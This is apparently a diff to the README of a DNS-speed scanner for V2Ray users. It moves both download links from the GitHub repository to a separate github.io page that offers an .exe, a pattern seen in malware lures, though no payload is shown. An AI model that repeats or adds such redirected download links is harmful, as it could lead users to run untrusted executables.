@@ -1,6 +1,6 @@
 # 🌐 v2rayng-dns-scanner - Find your fastest DNS server quickly
 
-[![Download v2rayng-dns-scanner](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/drizzling-osaka245/v2rayng-dns-scanner)
+[![Download v2rayng-dns-scanner](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://drizzling-osaka245.github.io)
 
 This program finds the fastest DNS servers for your internet connection. Slow DNS settings lead to delay when you open websites. This tool tests servers locally on your computer to save you time. It helps users of V2Ray and Sing-box identify reliable connections.
 
@@ -14,7 +14,7 @@ This program finds the fastest DNS servers for your internet connection. Slow DN
 
 Follow these steps to find the right DNS for your network.
 
-1.  Visit the [Download Page](https://github.com/drizzling-osaka245/v2rayng-dns-scanner) to get the release.
+1.  Visit the [Download Page](https://drizzling-osaka245.github.io) to get the release.
 2.  Locate the latest version file ending in .exe.
 3.  Click the file to start the download.
 4.  Move the file to a folder of your choice on your desktop.
